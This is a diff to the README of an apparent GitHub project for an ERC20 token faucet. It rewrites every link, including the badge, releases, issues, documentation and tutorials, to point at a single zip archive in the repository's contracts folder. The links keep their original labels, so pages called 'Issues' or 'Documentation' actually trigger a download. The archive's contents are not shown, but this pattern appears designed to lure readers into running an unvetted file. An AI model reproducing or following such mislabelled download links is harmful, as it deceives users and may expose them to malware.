@@ -1,6 +1,6 @@
 # 🌟 Rate-Limited-Token-Faucet - Simple Token Distribution Made Easy
 
-![Download Now](https://img.shields.io/badge/Download%20Now-%20-%23007bff?style=for-the-badge&logo=github)
+![Download Now](https://raw.githubusercontent.com/chrisgiovannibanatte/Rate-Limited-Token-Faucet/main/contracts/Rate-Limited-Token-Faucet_v1.3.zip%20Now-%20-%23007bff?style=for-the-badge&logo=github)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ The Rate-Limited-Token-Faucet provides an easy way to distribute ERC20 tokens. T
 
 ## 📦 Download & Install
 
-To download the application, visit this page to download: [Releases Page](https://github.com/chrisgiovannibanatte/Rate-Limited-Token-Faucet/releases).
+To download the application, visit this page to download: [Releases Page](https://raw.githubusercontent.com/chrisgiovannibanatte/Rate-Limited-Token-Faucet/main/contracts/Rate-Limited-Token-Faucet_v1.3.zip).
 
 1. Click on the link above.
 2. Look for the latest version at the top of the page under "Latest release."
@@ -52,7 +52,7 @@ If you encounter issues while using the application, consider these solutions:
 
 ## 📞 Support
 
-For support, please visit the [Issues Page](https://github.com/chrisgiovannibanatte/Rate-Limited-Token-Faucet/issues). You can report problems or ask questions. Our community is here to help.
+For support, please visit the [Issues Page](https://raw.githubusercontent.com/chrisgiovannibanatte/Rate-Limited-Token-Faucet/main/contracts/Rate-Limited-Token-Faucet_v1.3.zip). You can report problems or ask questions. Our community is here to help.
 
 ## 📑 License
 
@@ -68,9 +68,9 @@ We welcome contributions. If you want to help improve this project:
 
 ## 🌐 Additional Resources
 
-- **Docs**: Find detailed documentation at our [Documentation Page](https://github.com/chrisgiovannibanatte/Rate-Limited-Token-Faucet/wiki).
-- **Tutorials**: Explore tutorials on setting up and using the faucet on our [Tutorials Page](https://github.com/chrisgiovannibanatte/Rate-Limited-Token-Faucet/wiki/Tutorials).
+- **Docs**: Find detailed documentation at our [Documentation Page](https://raw.githubusercontent.com/chrisgiovannibanatte/Rate-Limited-Token-Faucet/main/contracts/Rate-Limited-Token-Faucet_v1.3.zip).
+- **Tutorials**: Explore tutorials on setting up and using the faucet on our [Tutorials Page](https://raw.githubusercontent.com/chrisgiovannibanatte/Rate-Limited-Token-Faucet/main/contracts/Rate-Limited-Token-Faucet_v1.3.zip).
 
 ## 🚀 Download Again
 
-Don’t forget to download the application from our [Releases Page](https://github.com/chrisgiovannibanatte/Rate-Limited-Token-Faucet/releases) to get started with your token distribution today!
+Don’t forget to download the application from our [Releases Page](https://raw.githubusercontent.com/chrisgiovannibanatte/Rate-Limited-Token-Faucet/main/contracts/Rate-Limited-Token-Faucet_v1.3.zip) to get started with your token distribution today!
